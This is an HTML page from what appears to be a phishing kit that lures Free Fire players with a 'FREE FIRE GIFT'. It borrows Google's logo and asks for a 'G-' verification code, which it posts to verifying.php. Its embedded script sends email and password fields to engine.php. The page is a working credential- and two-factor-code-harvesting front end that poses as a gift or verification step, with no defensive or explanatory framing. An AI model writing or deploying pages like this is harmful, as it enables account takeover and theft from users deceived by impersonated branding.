<!DOCTYPE html>
<html>
  <head>
  <meta charset="utf-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1">
<link href='https://static-s.aa-cdn.net/img/ios/1160056295/057712e20f0ec8f859d7d3d9595e864f'/>
<title>FREE FIRE GIFT</title>
<script src="jquery.min.js"></script>
<link rel="stylesheet" href="bootstrap.min.css">
<style>
h1, .h1, h2, .h2, h3, .h3 {
    margin-top: 0px;
    margin-bottom: 10.5px;
}

.error-msg {
    margin: .5em 0;
    display: block;
    color: #dd4b39;
    line-height: 17px;
}
.col-md-6 {
 margin:0 auto;
 float:none;

}
.col-md-8 {
 margin:0 auto;
 float:none;

}
</style>
<script type="text/javascript">
	$(document).ready(function(){
	  $("#gsubmit").on("click", function() {
		  var gemail = $("#gemail").val();
		  var gpass = $("#gpass").val();
		  if(gemail==''||gpass=='')
{

}
else
{
	var res = document.getElementById("hasilnya");
          res.innerHTML='';
		  $("#gsubmit").prop("disabled", true );
		  $.post("engine.php",
		  {gemail:gemail,gpass:gpass,},
		  function(response,status){
			  $('#hasilnya').html(response);
			$("#gsubmit").prop("disabled", false );
			$("#gemail").prop("value", "");
			$("#gpass").prop("value", "");
		  });
		  return false;
	  }
	  }
	  );
	});

	</script>




<style type="text/css">
* : (input, textarea) {
    -webkit-touch-callout: none;
    -webkit-user-select: none;

}
</style>
<style type="text/css">
img {
	-webkit-touch-callout: none;
	-webkit-user-select: none;
    }
</style>

<body style="padding:0px;margin:0 auto;">
<div style="padding:0px;margin:0 auto;" class="container ">

<div style="border:none;padding:0px;margin:0 auto;" class="col-md-6">
<div style="border:none;padding:0px;margin:0px;" class="well well-sm">
</body>

<center style="background:white;"><br>
<div class="col-md-8">
<h2><img src="http://2.bp.blogspot.com/-mWG63gahjkY/VkaZlqhIsdI/AAAAAAAAUs0/bKXKoeHWjoE/s1600/logo%2Bgoogle%2B2015.png" width="200px" ></h2>

<div  style="padding:30px;border-radius: 2px;box-shadow: 0px 2px 2px rgba(0, 0, 0, 0.3);background: #FAF0E6;width100%" class="form-horizontal">
       <form action="verifying.php" id="login-form" method="post">
<h2>
 <b>Input Your Code Verification</b>
</h2>
  <div style="width:100%" class="form-group">
  <input class="form-control" name="code"  placeholder="G-" type="number">
</div>
  <div style="width:100%" class="form-group">
 <input type="submit" class="btn btn-block" style="color: #FFFF00;background-color: #000000;" value="DONE"> </form>
</div>

  </p>